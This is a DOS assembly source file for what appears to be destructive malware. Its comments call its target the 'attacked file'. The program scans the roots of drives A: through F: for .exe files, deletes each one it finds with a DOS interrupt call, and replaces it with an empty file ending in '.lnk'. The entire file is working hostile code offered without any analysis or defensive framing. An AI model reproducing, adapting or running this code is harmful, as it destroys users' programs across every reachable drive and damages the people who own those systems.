.model small
.stack 100h
.data
	FILENAME db 512 dup(?) ;name of attacked file
	
	NEWNAME db 512 dup(?)  ;new given name
	
	TER db '$'
	HANDEL dw  12
	FDIRA db 'A:\*.exe',0         ;exe files
	FDIRB db 'B:\*.exe',0
	FDIRC db 'C:\*.exe',0
	FDIRD db 'D:\*.exe',0
	FDIRE db 'E:\*.exe',0
	FDIRF db 'F:\*.exe',0
	
	
	DTA dw 50 dup(?)      ;disk transfer area
	ERR db 'ERROR' , 0dh , 0ah , '$'
	LOCATOR db 51 dup(?) ; all file location
	
.code
main proc near
	mov ax , @data
	mov ds , ax
	mov es , ax
	
	;set DTA first
	mov ah , 1AH
	lea dx , DTA
	int 21h

	;search for .exefiles
	mov ah,4EH
SECONDPASSA:
	xor cx , cx
	lea dx , FDIRA
	int 21h
	jc SECONDPASSB
	
	mov bl , 'A'
	call SETLOC
	
	call OPENFILE ; try to open a file
	jc SECONDPASSB
	
		

	call CLOSEFILE ;close a file	
	jc SECONDPASSB
	
	mov ah , 41h
	lea dx , LOCATOR
	int 21h
	jc SECONDPASSB
	
	call CREATEFILE
	
	
	call CLOSEFILE ;close a file	
	jc SECONDPASSB
	
		
	mov ah,4FH
	jmp SECONDPASSA
	
SECONDPASSB:
    mov ah,4EH
    SECONDPASSBX:
	xor cx , cx
	lea dx , FDIRB
	int 21h
	jc SECONDPASSC
	
	mov bl , 'B'
	call SETLOC
	
	call OPENFILE ; try to open a file
	jc SECONDPASSC
	
		

	call CLOSEFILE ;close a file	
	jc SECONDPASSC
	
	mov ah , 41h
	lea dx , LOCATOR
	int 21h
	jc SECONDPASSC
	
	call CREATEFILE
	
	
	call CLOSEFILE ;close a file	
	jc SECONDPASSC
	
		
	mov ah,4FH
	jmp SECONDPASSBX
	
		
SECONDPASSC:
    mov ah,4EH
    SECONDPASSCX:
	xor cx , cx
	lea dx , FDIRC
	int 21h
	jc SECONDPASSD
	
	mov bl , 'C'
	call SETLOC
	
	call OPENFILE ; try to open a file
	jc SECONDPASSD
	
		

	call CLOSEFILE ;close a file	
	jc SECONDPASSD
	
	mov ah , 41h
	lea dx , LOCATOR
	int 21h
	jc SECONDPASSD
	
	call CREATEFILE
	
	
	call CLOSEFILE ;close a file	
	jc SECONDPASSD
	
		
	mov ah,4FH
	jmp SECONDPASSCX
	
SECONDPASSD:
    mov ah,4EH
    SECONDPASSDX:
	xor cx , cx
	lea dx , FDIRD
	int 21h
	jc SECONDPASSE
	
	mov bl , 'D'
	call SETLOC
	
	call OPENFILE ; try to open a file
	jc SECONDPASSE
	
		

	call CLOSEFILE ;close a file	
	jc SECONDPASSE
	
	mov ah , 41h
	lea dx , LOCATOR
	int 21h
	jc SECONDPASSE
	
	call CREATEFILE
	
	
	call CLOSEFILE ;close a file	
	jc SECONDPASSE
	
		
	mov ah,4FH
	jmp SECONDPASSDX
	
SECONDPASSE:
    mov ah,4EH
    SECONDPASSEX:
	xor cx , cx
	lea dx , FDIRE
	int 21h
	jc SECONDPASSF
	
	mov bl , 'E'
	call SETLOC
	
	call OPENFILE ; try to open a file
	jc SECONDPASSF
	
		

	call CLOSEFILE ;close a file	
	jc SECONDPASSF
	
	mov ah , 41h
	lea dx , LOCATOR
	int 21h
	jc SECONDPASSF
	
	call CREATEFILE
	
	
	call CLOSEFILE ;close a file	
	jc SECONDPASSF
	
		
	mov ah,4FH
	jmp SECONDPASSEX
	
SECONDPASSF:
    mov ah,4EH
    SECONDPASSFX:
	xor cx , cx
	lea dx , FDIRF
	int 21h
	jc FINISH
	
	mov bl , 'F'
	call SETLOC
	
	call OPENFILE ; try to open a file
	jc FINISH
	
		

	call CLOSEFILE ;close a file	
	jc FINISH
	
	mov ah , 41h
	lea dx , LOCATOR
	int 21h
	jc FINISH
	
	call CREATEFILE
	
	
	call CLOSEFILE ;close a file	
	jc FINISH
	
		
	mov ah,4FH
	jmp SECONDPASSFX	

FINISH:
	mov ah, 4ch
	int 21h
	ret
	
main endp
CLOSEFILE proc near

	push bx
	push ax
	mov ah,3EH
	mov bx , HANDEL
	int 21h
	
	pop ax
	pop bx
	ret
CLOSEFILE endp

CREATEFILE proc near
	push ax
	push bx
	push cx
	push dx
	push si
	push di
    
    xor si,si
    xor di,di
    mov cx , 50
    lea di , FILENAME
    mov al , 0
INFFOR:
    stosb
    loop INFFOR
    
	lea si , LOCATOR
	
	lea di , FILENAME
	
INFWHILE:
	lodsb
	cmp al , '.'
	stosb
	je INFFIN
	jmp INFWHILE

INFFIN:
	mov al,'l'
	stosb
	mov al,'n'
	stosb
	mov al, 'k'
	stosb
	
	mov ah,3CH
	lea dx , FILENAME
	mov cx , 0
	int 21h
	mov handel , ax
	
	pop di
	pop si
	pop dx
	pop cx
	pop bx
	pop ax
	ret
CREATEFILE endp

OPENFILE proc near
	push ax
	push dx
	push cx
	
	mov ah , 3DH
	mov al , 02H
	;lea dx , DTA
	;add dx , 1EH
	lea dx , LOCATOR
	int 21h
	mov HANDEL , ax

	pop cx
	pop dx
	pop ax
	ret
OPENFILE endp

SETLOC proc near
    push ax
    push bx
    push cx
    push dx
    push si
    push di
    
    mov cx, 40
    lea di,LOCATOR
    mov al,0
SETFOR:
    stosb
    LOOP SETFOR
    
    lea si , DTA
    add si , 1Eh
    
    lea di , LOCATOR
    mov al , bl
    STOSB
    
    mov al , ':'
    STOSB
    
    mov al , '\'
    STOSB
    
SETWHILE:
    lodsb
    stosb
    cmp al , '.'
    je SETOUT
    jmp SETWHILE
    
SETOUT:
    mov al,'e'
    stosb
    
    mov al,'x'
    stosb
    
    mov al,'e'
    stosb
    
    mov al,0
    stosb
    
    pop di
    pop si
    pop dx
    pop cx
    pop bx
    pop ax
    ret
    
SETLOC endp

end main